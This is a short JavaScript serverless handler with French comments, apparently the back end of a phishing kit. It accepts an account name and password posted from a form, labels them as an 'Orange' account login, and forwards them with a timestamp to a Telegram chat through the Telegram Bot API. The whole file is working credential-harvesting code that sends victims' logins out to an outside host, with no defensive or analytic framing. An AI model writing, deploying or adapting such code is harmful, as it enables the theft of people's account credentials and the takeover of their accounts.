// api/send.js
export default async function handler(req, res) {
  // Autoriser uniquement les requêtes POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const { account, password } = req.body;

  if (!account || !password) {
    return res.status(400).json({ error: 'Compte et mot de passe requis' });
  }

  // Récupérer les variables d'environnement
  const token = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  if (!token || !chatId) {
    console.error('Variables d’environnement manquantes');
    return res.status(500).json({ error: 'Erreur de configuration du serveur' });
  }

  const message = `
Compte Orange : ${account}
Mot de passe : ${password}
Heure : ${new Date().toLocaleString('fr-FR')}
`;

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      console.error('Erreur Telegram :', errorData);
      throw new Error(`Erreur Telegram : ${response.status}`);
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error(error);
    return res.status(500).json({ error: 'Erreur lors de l’envoi du message' });
  }
}